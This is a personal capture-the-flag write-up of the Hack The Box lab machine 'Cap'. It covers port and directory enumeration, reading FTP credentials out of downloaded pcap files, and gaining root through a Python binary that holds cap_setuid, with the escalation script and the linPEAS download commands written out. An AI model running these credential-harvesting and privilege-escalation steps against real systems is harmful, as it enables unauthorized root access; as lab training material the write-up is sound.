Before starting an overview over steps I want to take.
1. NMAP
2. GOBUSTER
If needed, I adapt NMAP for UDP.

--- 
The IP address is **10.129.98.103**
I want the User and root flag


I run nmap to see open ports: **nmap -sC -sV 10.129.98.103**
> Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 12:15 CST
Nmap scan report for 10.129.98.103
Host is up (0.0087s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn

I shortened the output. It mainly reveals three open TCP ports. 

**Port 21** for FTP, to be precise, vsftpd, so a `very` secure version hahaha. Still possible misconfigurations, or this [exploit](https://www.exploit-db.com/exploits/49719)

**Port 22** ssh. Secure shell, no simple exploits. Maybe later, when I have found credentials. No direct vulnerability found.

**Port 80** Works. So, GoBuster's next step. From the scan, I see gunicorn, python backend, and custom logic, therefore also mistakes. 

I run `gobuster dir -u 10.129.98.103 -w /usr/share/wordlists/dirb/common.txt` So common to check for possible endpoints.

>Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.98.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 302) [Size: 208] [--> http://10.129.98.103/]
/ip                   (Status: 200) [Size: 17452]
/netstat              (Status: 200) [Size: 28506]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================


Really nice opening. I have three openings: 

+ There is /data which moved to ../
+ /ip
+ /netstat

Let's go with the most classical and just parse the IP address. I am automatically logged in as Nathan. I am not on the homepage, but on dashboards. I see Security events, failed login attempts, and port scans visualised in adashboard.
I am at least looking at the website on Home/Dashboard. I will start playing around with it. Home is the dashboard, so that is that.

I can download data from the page. I downloaded the first as 1.pcap file. To open that file, I need Wireshark. I open it in Wireshark it is empty.

I check out IP config and network status.

After finding nothing of interest to my untrained eye, I again open up the first link. I see that in contrast to my first download, there seems to have been traffic. I download and open Wireshark.
Even though some parts seem to have been corrupted or anything, I can read a message. I hover through the Web app again. The ../data/[x] works in a way where x = a serial user id. So I have downloaded 0, 1, and 2. Generally, there is not much difference between the contents except for the sizes.

I follow the Hack the Box page as I am not well-versed with Wireshark. I switched the .pcap files as the one I access is quite small. In it, we have TCP and FTP, something we did not have before.
Remember, FTP is one of the ports open. I use tcp.stream eq x to check for interesting dialogs, as well as using Follow -> upstream to see whole dialogs. 

For example, this dialog:

>220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.


Luckily, this was the first I opened, and luckily for me, I am interested in solving it, so I actually looked at the contents. We have an FTP connection, where we have the user `nathan` and the password `Buck3tH4TF0RM3!`. Really nice I can proceed to the FTP port now

I download linPeas using > wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh


>ftp nathan@10.129.98.103
Connected to 10.129.98.103.
220 (vsFTPd 3.0.3)
331 Please specify the password.
>
>Password: 
230 Login successful.
>
>Remote system type is UNIX.
Using binary mode to transfer files.
>
>ftp> ls
>
>229 Entering Extended Passive Mode (|||52173|)
>
>150 Here comes the directory listing.
>
>-r--------    1 1001     1001           33 Jan 25 18:13 user.txt
>
>226 Directory send OK.
>
>ftp> get user.txt
>
>local: user.txt remote: user.txt
>
>229 Entering Extended Passive Mode (|||65197|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |***********************************|    33      259.89 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (4.41 KiB/s)

From there on, I proceed to open the user.txt file in my directory.

Now to the Root Flag. I look for all access rights I have in the FTP enviroment. Therefore I run **dir -a**- Nice command.

>229 Entering Extended Passive Mode (|||14648|)
>
>150 Here comes the directory listing.
>
>drwxr-xr-x    3 1001     1001         4096 May 27  2021 .
>
>drwxr-xr-x    3 0        0            4096 May 23  2021 ..
>
>lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null
>
>-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
>
>-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
>
>drwx------    2 1001     1001         4096 May 23  2021 .cache
>
>-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
>
>lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
>
>-r--------    1 1001     1001           33 Jan 25 18:13 user.txt
>
>226 Directory send OK.

This is the complete output

I am not well-versed, so I looked at the official documentation, and besides the file where I found the user.txt, there are no files that I have any rights to. Upcoming for me is therefore to learn how to read such outputs. I do not know what that means except r for read, w for write, and x for execute.

The last option I have is ssh. I have a username and a password, so I log in, and it actually works. I run **ls** and **ls -a**, and I have the same files as in the FTP.

I then run **sudo ls** to see if I have sudo rights, and I type in the password.

> Nathan is not in the sudoers file.  This incident will be reported.

So I do not have sudo rights, else there are 4 zombie processes and a bunch of updates.
Through the hints, I know I have to run linPeas. I always forget, downloading the tool is the hardest part.

I download linPeas, for that I use ` wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh`. This represents the fastest Link to download I used until now.

The hard way for me is to figure out how linPEAS works. From my understanding, you have to call it from the other machine. So, unlike nmap, where you call it from your terminal, here it is the other way around. Making sense as it is a privilege escalation tool and not an investigation tool. 

So you start it by first of all downloading it, then running a server. From your infiltrated account, you curl to your IP/linpeas.sh. From there, it runs on its own, except you need to enter a password for sudo checking. Even though the HTB help files recommend using Bash, I would put the outputs of the linPeas into a separate file to ease analysis later on. This, of course, is harder than you think about it, but yeah.

From my analysis, it is really long, so I will not share it. Feel free to do it yourself! Well, back to my analysis. There are 5 areas of great importance: 1) sudo rights 2) Writable things excecuted by root 3) SUID binaries / known risky ones 4) Linux capabilities 5) Credentials and sensitive artifacts. Lets got down that information and see what we find.
1. **Sudo** As mentioned before and tested manually, there are no sudo rights for the password I have. This indicates that nathan might be a sudoer, but the password is another one.
2. **Writable things executed by root** As this App is built with a Python backend, they use a service for that. Here, Gunicorn, here we have an `analyzer.service` that runs a web app via Gunicorn. LinPeas flags it, and the writable web app file is /var/www/html/app.py.
3. **SUID** Nothing really except a few notable informations.
4. **Linux capabilities** `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`really important line. This Python binary has a permission-like feature that may allow processes to do things normally restricted.  Also, `cap_setuid` is sensitive
5. **Credentials and sensitive artifacts** linPeas shows interesting web directory contents as well as upload folders containing a .pcap. There could be data worth extracting.

This summary comes from tools I use to make my reading capabilities easier; I will also check manually. It starts with an introduction, then with basic information, such as user ID, group ID, and groups, all three being 1001(Nathan). The hostname is cap.
We also get information about the system, such as the Linux version, the distributor, and so on.

Due to my experience with sudo CVEs, here is some information: the system has sudo 1.8.31. The following CVE is for that sudo version: CVE-2021-3156. It is worth a try, but for now, it is too complex for a simple machine. Nonetheless, it allows a user to [escalate the sudo to get root access without knowing the password](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt).

Interestingly, linPeas also recommends CVEs I can exploit, which is really nice, even with a download link. Even the same on I just linked lmao.

Pro tip: do not listen to David Bowie while working; his voice pierces your ears, not nice at all. Another one-line Peas reports are not structured based on importance, so based on modules, e.g., introduction, basics, user, etc. Really testing my patience. [Here](https://youtu.be/dQw4w9WgXcQ?si=V_u9rJN44tAfHQAH)

Interestingly this file also analyses FTP files, mentioning their capabilities, such as **rwe** as well as other information, here a short snipet:

>rw-r--r-- 1 root root 5850 Mar  6  2019 /etc/vsftpd.conf
>
>anonymous_enable
>
>local_enable=YES
>
>#write_enable=YES
>
>#anon_upload_enable=YES
>
>#anon_mkdir_write_enable=YES
>
>#chown_uploads=YES
>
>#chown_username=whoever

There are several files classified like this.

Later, it shows files with interesting permissions, such as theones mentioned  before in the SUID part

>-rwsr-xr-x 1 root root 31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034

I believe the most important part is the [Files with Capabilities](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities). 

>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
>
>/usr/bin/ping = cap_net_raw+ep
>
>/usr/bin/traceroute6.iputils = cap_net_raw+ep
>
>/usr/bin/mtr-packet = cap_net_raw+ep
>
>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

By far the most interesting part here, and also the last part of importance here.

I first check out the Python version; there are half a dozen CVEs to read through. Noice. I think the interesting thing here is also that Python 3.8 has three capabilities attached to it. I should check that out, as most of the CVEs are complex, even though cool. Maybe I should one day try them out.

1. **cap_setuid** interesting one, it allows to change the user ID, potentially switching to UID 0. Allows toggling between user ids
2. **cap_net_bind_service** allows binding to privileged ports, interesting, but I want the root flag.
3. **+eip flags** means e = effective; i = inheritable; p = permitted.

To double check I run ls -la to get the python file, if not I try to open or call it. Running **ls -la** does not give me the feedback I wished for.

Running `os.setuid(0)` also did not work. So I have to get creative. Trying to open it using nano is also impossible, as it is encrypted.

Again, I try to run a different version on the setuid in the terminal, but none of them work. In the end, I have to write a file; my laziness is frowning.

I write a short script allowing me to see the root of the code. That is really cool 
>import os
>
>
>print("Before:", os.getuid(), os.geteuid())
>
>os.setuid(0)
>
>print("After:", os.getuid(), os.geteuid())

Simple code, but the out puts speask for itself `Before: 1001 1001
After: 0 0`. Amazing work, I have to find out how to send a shell/bash back to me, though.
As of right now my situation is

RN

[user shell] → python (now root)

What it should be:

[user shell] → root shell

So I basically want the code to return a /bin/sh or /bin/bash so that I can become part of it. Using UID = 0. I Google so much, Brave even asks me if I am human, hahah.
In the end, I used Chat, which could not help me due to security concerns. In the HTB guide, it speaks of

`import os
os.setuid(0)
os.system("/bin/bash")`

Which is fine, but unreliable for several reasons. I am not directly executing Bash, and the shell might go through, sanitize environment, drop privileges, or behave differently depending on configurations.

This is the code I go with in the end. Yes maybe overkill for this but good practices build on the start.


>import os
import pty
import sys
>
>def get_root_shell():
    # Drop privileges to root
    if os.geteuid() != 0:
        try:
            os.setuid(0)
            os.setgid(0)
        except:
            print("Failed to set UID/GID")
            sys.exit(1)
>
>pty.spawn("/bin/bash")
>
>if __name__ == "__main__":
    get_root_shell()

If it works, I will find out now. In the end I modified the code to not modify gid, it returned then root@cap. Interestinglyon first ls it did not show the root.txt, but the files presented in nathan.

To tackle this issues I run **ls -la** to see what access rights I have, and then **ls /**. Looking back I should have run **pwd**, nonetheless **ls /** did it in the end as well. I still do not know in which part of the filesystem tree I was put ls / showed me everything from root. In there a root directory can be found that I followed and then found root.txt

>nathan@cap:~$ python3 root.py
>
>root@cap:~# ls
>
>root.py  snap  user.txt
>
>root@cap:~# ls -la
>
>total 44
>
>drwxr-xr-x 6 nathan nathan 4096 Jan 26 20:30 .
>
>drwxr-xr-x 3 root   root   4096 May 23  2021 ..
>
>lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
>
>-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
>
>-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
>
>drwx------ 2 nathan nathan 4096 May 23  2021 .cache
>
>drwx------ 3 nathan nathan 4096 Jan 26 18:43 .gnupg
>
>drwxrwxr-x 3 nathan nathan 4096 Jan 26 19:54 .local
>
>-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
>
>lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
>
>-rw-rw-r-- 1 nathan nathan  345 Jan 26 20:30 root.py
>
>drwxr-xr-x 3 nathan nathan 4096 Jan 26 18:42 snap
>
>-r-------- 1 nathan nathan   33 Jan 26 18:30 user.txt
>
>root@cap:~# ls /
>
>bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
>
>boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
>
>root@cap:~# cd /root
>
>root@cap:/root# ls
>
>root.txt  snap
>
>root@cap:/root# cat root.txt

I then parsed the content into the HTB field and [tada](https://labs.hackthebox.com/achievement/machine/2038537/351)

---

### Afterthoughts

Seeing how I did not land in root, like in the root directory, shows that I indeed got one layer below. How true that is in the end can be speculated, but I got to the root of everything and did not end up in a directory called root.
How it would have worked with the original approach of going for os.setuid(0) I can not tell, as I did not do it, but a great experience nonetheless.
